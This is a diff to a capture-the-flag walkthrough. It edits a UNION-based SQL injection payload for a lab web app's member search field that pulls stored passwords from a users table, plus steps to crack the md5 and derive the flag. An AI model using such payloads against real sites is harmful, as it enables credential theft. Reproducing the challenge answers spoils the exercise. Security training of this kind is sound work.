@@ -9,8 +9,11 @@ We are interested by this table :
 ---------------------------------------------------------------------------------^---------------^--------
 
 Make this SQL Injection in the "SEARCH MEMBER BY ID:" field :
-1 AND 1=2 UNION SELECT Commentaire, countersign FROM users WHERE user_id = 5
+1 AND 1=2 UNION SELECT Commentaire, countersign FROM users
 
-Get the code, follow the instruction (md5 decode, lowercase, then sha256 encode the result (FortyTwo))
+As you can see, the user number 5 is the flag (you can add "WHERE user_id = 5" to the latest SQL injection 
+if you want to have just the right user).
 
-URL: http://10.13.0.186/?page=member
+Get the surname (which is the password), follow the instruction (md5 decode, lowercase, then sha256 encode the result (FortyTwo))
+
+URL: http://<ip>/?page=member
